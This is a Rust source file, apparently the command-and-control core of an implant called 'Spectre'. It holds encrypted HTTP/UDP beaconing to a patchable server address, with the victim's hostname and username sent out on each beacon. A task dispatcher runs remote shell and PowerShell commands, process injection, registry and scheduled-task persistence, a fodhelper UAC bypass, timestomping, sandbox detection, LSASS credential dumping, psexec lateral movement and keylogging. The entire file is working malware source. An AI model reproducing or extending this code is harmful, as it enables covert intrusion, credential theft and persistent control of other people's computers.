#[cfg(not(target_os = "windows"))]
use crate::utils::syscalls::*;
use alloc::format;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
use wraith_crypto::noise::{NoiseHandshake, NoiseKeypair, NoiseTransport};
use wraith_crypto::x25519::PublicKey;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub mod packet;
use packet::{WraithFrame, FRAME_TYPE_DATA};

// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";

#[repr(C)]
pub struct PatchableConfig {
    magic: [u8; 19],
    pub server_addr: [u8; 64],
    pub sleep_interval: u64,
}

// Place in .data section to be writable/patchable
#[link_section = ".data"]
pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
    magic: CONFIG_MAGIC,
    server_addr: [0u8; 64], // Zeros to be patched
    sleep_interval: 5000,
};

#[derive(Debug, Serialize, Deserialize, Clone, Copy)]
pub enum TransportType {
    Http,
    Udp,
}

pub struct C2Config {
    pub transport: TransportType,
    pub server_addr: &'static str,
    pub sleep_interval: u64,
}

impl C2Config {
    pub fn get_global() -> Self {
        unsafe {
            // Check if patched
            let addr_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.server_addr);
            let addr_slice = &*addr_ptr;
            let addr_len = addr_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let addr_str = if addr_len > 0 {
                core::str::from_utf8_unchecked(&addr_slice[..addr_len])
            } else {
                "127.0.0.1"
            };

            Self {
                transport: TransportType::Http,
                server_addr: addr_str,
                sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
            }
        }
    }
}

pub trait Transport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
}

// Linux Implementation
#[cfg(not(target_os = "windows"))]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            // Parse host (simplified: assume IPv4)
            // 127.0.0.1 -> 0x0100007F
            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            let req = format!(
                "POST /api/v1/beacon HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n",
                self.host,
                data.len()
            );

            sys_write(sock, req.as_ptr(), req.len());
            sys_write(sock, data.as_ptr(), data.len());

            let mut buf = [0u8; 4096];
            let mut resp_vec = Vec::new();
            loop {
                let n = sys_read(sock, buf.as_mut_ptr(), 4096);
                if n == 0 || (n as isize) < 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..n]);
            }
            sys_close(sock);

            let mut body_start = 0;
            for i in 0..resp_vec.len().saturating_sub(3) {
                if resp_vec[i] == 13 && resp_vec[i + 1] == 10 && resp_vec[i + 2] == 13 && resp_vec[i + 3] == 10 {
                    body_start = i + 4;
                    break;
                }
            }

            if body_start > 0 {
                Ok(resp_vec[body_start..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// Windows Implementation
#[cfg(target_os = "windows")]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        let wininet_hash = hash_str(b"wininet.dll");
        unsafe {
            type InternetOpenA = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
            type InternetConnectA = unsafe extern "system" fn(HANDLE, *const u8, u16, *const u8, *const u8, u32, u32, u32) -> HANDLE;
            type HttpOpenRequestA = unsafe extern "system" fn(HANDLE, *const u8, *const u8, *const u8, *const u8, *const *const u8, u32, u32) -> HANDLE;
            type HttpSendRequestA = unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
            type InternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
            type InternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let internet_open: InternetOpenA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetConnectA")));
            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpOpenRequestA")));
            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpSendRequestA")));
            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetReadFile")));
            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetCloseHandle")));

            let h_inet = internet_open(b"Spectre\0".as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
            if h_inet.is_null() { return Err(()); }

            let mut host_c = Vec::from(self.host.as_bytes());
            host_c.push(0);
            let h_conn = internet_connect(h_inet, host_c.as_ptr(), self.port, core::ptr::null(), core::ptr::null(), 3, 0, 0);
            if h_conn.is_null() { 
                internet_close(h_inet);
                return Err(()); 
            }

            let h_req = http_open(h_conn, b"POST\0".as_ptr(), b"/api/v1/beacon\0".as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
            if h_req.is_null() {
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            if http_send(h_req, core::ptr::null(), 0, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
                internet_close(h_req);
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            let mut resp_vec = Vec::new();
            let mut buf = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0 || bytes_read == 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
            }

            internet_close(h_req);
            internet_close(h_conn);
            internet_close(h_inet);

            Ok(resp_vec)
        }
    }
}

// UDP Transport
#[cfg(not(target_os = "windows"))]
pub struct UdpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl UdpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for UdpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            // UDP socket
            let sock = sys_socket(2, 2, 0); // AF_INET, SOCK_DGRAM
            if (sock as isize) < 0 { return Err(()); }

            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            let sent = sys_sendto(sock, data.as_ptr(), data.len(), 0, &addr as *const _ as *const u8, 16);
            if sent < 0 {
                sys_close(sock);
                return Err(());
            }

            let mut buf = [0u8; 4096];
            let mut src_addr = SockAddrIn { sin_family: 0, sin_port: 0, sin_addr: 0, sin_zero: [0; 8] };
            let mut addr_len = 16u32;
            
            let n = sys_recvfrom(sock, buf.as_mut_ptr(), 4096, 0, &mut src_addr as *mut _ as *mut u8, &mut addr_len);
            sys_close(sock);

            if n > 0 {
                Ok(buf[..n as usize].to_vec())
            } else {
                Err(())
            }
        }
    }
}

#[cfg(target_os = "windows")]
pub struct UdpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl UdpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
impl Transport for UdpTransport {
    fn request(&mut self, _data: &[u8]) -> Result<Vec<u8>, ()> {
        Err(())
    }
}

fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()> {
    let keypair = NoiseKeypair::generate().map_err(|_| ())?;
    let mut noise = NoiseHandshake::new_initiator(&keypair).map_err(|_| ())?;

    // Msg 1 (Init -> Resp)
    let msg1 = noise.write_message(&[]).map_err(|_| ())?;
    let resp = transport.request(&msg1)?;

    // Msg 2 (Resp -> Init) - Receive Responder Ratchet PubKey
    let peer_payload = noise.read_message(&resp).map_err(|_| ())?;
    let peer_ratchet_pub = if peer_payload.len() >= 32 {
        let mut b = [0u8; 32];
        b.copy_from_slice(&peer_payload[0..32]);
        Some(PublicKey::from_bytes(b))
    } else {
        return Err(());
    };

    // Msg 3 (Init -> Resp) - Send 32 bytes of zeros
    let msg3 = noise.write_message(&[0u8; 32]).map_err(|_| ())?;
    let _ = transport.request(&msg3)?;

    // Initiator doesn't need local ratchet key (it generates one)
    // It needs peer ratchet key.
    noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
}

pub fn run_beacon_loop(_initial_config: C2Config) -> !
{
    let config = C2Config::get_global();
    let mut http_transport = HttpTransport::new(config.server_addr, 8080);
    let mut udp_transport = UdpTransport::new(config.server_addr, 9999);
    
    let mut use_udp = matches!(config.transport, TransportType::Udp);

    let mut mesh_server = crate::modules::mesh::MeshServer::new();
    let _ = mesh_server.start_tcp(4444);
    let _ = mesh_server.start_pipe("wraith_mesh");

    let mut session;
    loop {
        let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
        
        match perform_handshake(transport) {
            Ok(s) => {
                session = s;
                break;
            },
            Err(_) => {
                // Failover
                use_udp = !use_udp;
                crate::utils::obfuscation::sleep(config.sleep_interval);
            }
        }
    }

    let mut packet_count: u64 = 0;
    let mut last_rekey = 0;
    let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes

    loop {
        // Check if rekey is needed
        if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
            session.rekey_dh();
            packet_count = 0;
            last_rekey = 0;
        }

        // 1. Poll Mesh Server
        let mesh_data = mesh_server.poll();
        for (data, client_idx) in mesh_data {
            let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
            relay_frame.stream_id = client_idx as u16;
            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
            if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
                let _ = transport.request(&msg_to_send);
            }
        }

        let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
        let username_sd = crate::modules::discovery::Discovery.get_username();
        
        let mut hostname_str = alloc::string::String::from("unknown");
        let mut username_str = alloc::string::String::from("unknown");
        
        if let Some(guard) = hostname_sd.unlock() {
            hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
        }
        if let Some(guard) = username_sd.unlock() {
            username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
        }

        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname_str, username_str);
        
        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
        let frame_bytes = frame.serialize();

        if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
            packet_count += 1;

            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
            if let Ok(resp) = transport.request(&msg_to_send) {
                if let Ok(pt) = session.read_message(&resp) {
                    // Pass transport to dispatch_tasks if needed (it takes &mut HttpTransport in original, needs update)
                    // Wait, dispatch_tasks took &mut HttpTransport?
                    // Yes: `dispatch_tasks(..., transport: &mut HttpTransport, ...)`
                    // I need to change signature of dispatch_tasks too.
                    dispatch_tasks(&pt, &mut session, transport, &mut mesh_server);
                }
            } else {
                // Failover on request failure
                use_udp = !use_udp;
            }
        }

        last_rekey += 1;
        crate::utils::obfuscation::sleep(config.sleep_interval);
    }
}

#[derive(Deserialize)]
struct Task {
    #[allow(dead_code)]
    id: alloc::string::String,
    #[serde(rename = "type_")]
    task_type: alloc::string::String,
    payload: alloc::string::String,
}

#[derive(Deserialize)]
struct TaskList {
    tasks: alloc::vec::Vec<Task>,
}

fn hex_decode(s: &str) -> Vec<u8> {
    let mut res = Vec::new();
    let chars: Vec<char> = s.chars().collect();
    for i in (0..s.len()).step_by(2) {
        if i + 1 < s.len() {
            let byte_str = format!("{}{}", chars[i], chars[i+1]);
            if let Ok(byte) = u8::from_str_radix(&byte_str, 16) {
                res.push(byte);
            }
        }
    }
    res
}

use crate::utils::sensitive::SensitiveData;
use zeroize::Zeroize;

// ...

fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn Transport, mesh_server: &mut crate::modules::mesh::MeshServer) {
    if let Some(frame) = WraithFrame::deserialize(data) {
        if frame.frame_type == packet::FRAME_TYPE_REKEY {
            // Double Ratchet handles rekeying automatically
            return;
        }
        if frame.frame_type == packet::FRAME_TYPE_MESH_RELAY {
            // Forward payload to child
            mesh_server.send_to_client(frame.stream_id as usize, &frame.payload);
            return;
        }
    }

    let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
        &data[..idx]
    } else {
        data
    };

    static mut SOCKS_PROXY: Option<crate::modules::socks::SocksProxy> = None;

    if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
        for task in response.tasks {
            let mut result: Option<SensitiveData> = None;

            match task.task_type.as_str() {
                "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                "shell" => {
                    result = Some(crate::modules::shell::Shell.exec(&task.payload));
                },
                "powershell" => {
                    result = Some(crate::modules::powershell::PowerShell.exec(&task.payload));
                },
                "inject" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let pid = parts[0].parse::<u32>().unwrap_or(0);
                        let method = match parts[1] {
                            "reflective" => crate::modules::injection::InjectionType::Reflective,
                            "hollowing" => crate::modules::injection::InjectionType::Hollowing,
                            "hijack" => crate::modules::injection::InjectionType::ThreadHijack,
                            _ => crate::modules::injection::InjectionType::Reflective,
                        };
                        let payload = hex_decode(parts[2]);
                        let res = crate::modules::injection::Injector.inject(pid, &payload, method);
                        let msg = if res.is_ok() { b"Injection successful" as &[u8] } else { b"Injection failed" as &[u8] };
                        result = Some(SensitiveData::new(msg));
                    }
                },
                "bof" => {
                    let bof_data = hex_decode(&task.payload);
                    let mut res_vec;
                    #[cfg(target_os = "windows")]
                    {
                        let loader = crate::modules::bof_loader::BofLoader::new(bof_data);
                        if loader.load_and_run().is_ok() {
                            res_vec = loader.get_output();
                        } else {
                            res_vec = b"BOF execution failed".to_vec();
                        }
                    }
                    #[cfg(not(target_os = "windows"))]
                    {
                        let _ = bof_data;
                        res_vec = b"BOF only supported on Windows".to_vec();
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                },
                "socks" => {
                    let mut res_vec;
                    unsafe {
                        if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
                            *core::ptr::addr_of_mut!(SOCKS_PROXY) = Some(crate::modules::socks::SocksProxy::new());
                        }
                        let payload = hex_decode(&task.payload);
                        res_vec = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                },
                "persist" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let method = parts[0];
                        let name = parts[1];
                        let path = parts[2];
                        let res = match method {
                            "registry" => crate::modules::persistence::Persistence.install_registry_run(name, path),
                            "task" => crate::modules::persistence::Persistence.install_scheduled_task(name, path),
                            _ => Err(()),
                        };
                        let msg = if res.is_ok() { b"Persistence installed" as &[u8] } else { b"Persistence failed" as &[u8] };
                        result = Some(SensitiveData::new(msg));
                    } else {
                        result = Some(SensitiveData::new(b"Invalid persist args"));
                    }
                },
                "uac_bypass" => {
                    let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
                    let msg = if res.is_ok() { b"Exploit triggered" as &[u8] } else { b"Exploit failed" as &[u8] };
                    result = Some(SensitiveData::new(msg));
                },
                "timestomp" => {
                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
                        let msg = if res.is_ok() { b"Timestomped" as &[u8] } else { b"Failed" as &[u8] };
                        result = Some(SensitiveData::new(msg));
                    }
                },
                "sandbox_check" => {
                    let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
                    let s = format!("Is Sandbox: {}", is_sandbox);
                    let mut v = s.into_bytes();
                    result = Some(SensitiveData::new(&v));
                    v.zeroize();
                },
                "dump_lsass" => {
                    if let Ok(sd) = crate::modules::credentials::Credentials.dump_lsass(&task.payload) {
                        result = Some(sd);
                    } else {
                        result = Some(SensitiveData::new(b"Dump failed"));
                    }
                },
                "sys_info" => {
                    result = Some(crate::modules::discovery::Discovery.sys_info());
                },
                "net_scan" => {
                    result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
                },
                "psexec" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let res = crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
                        let msg = if res.is_ok() { b"Service created" as &[u8] } else { b"Failed" as &[u8] };
                        result = Some(SensitiveData::new(msg));
                    }
                },
                "service_stop" => {
                    let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
                    let msg = if res.is_ok() { b"Service stopped" as &[u8] } else { b"Failed" as &[u8] };
                    result = Some(SensitiveData::new(msg));
                },
                "keylogger" => {
                    result = crate::modules::collection::Collection.keylogger_poll();
                },
                "mesh_relay" => {
                    let packet = hex_decode(&task.payload);
                    let mut res_vec = Vec::new();
                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() } {
                        res_vec = proxy.process(&packet);
                    }
                    result = Some(SensitiveData::new(&res_vec));
                    res_vec.zeroize();
                },
                _ => {}
            }

            if let Some(sensitive) = result {
                if let Some(guard) = sensitive.unlock() {
                    let frame = WraithFrame::new(FRAME_TYPE_DATA, guard.to_vec());
                    if let Ok(msg_to_send) = session.write_message(&frame.serialize()) {
                        let _ = transport.request(&msg_to_send);
                    }
                }
            }
        }
    }
}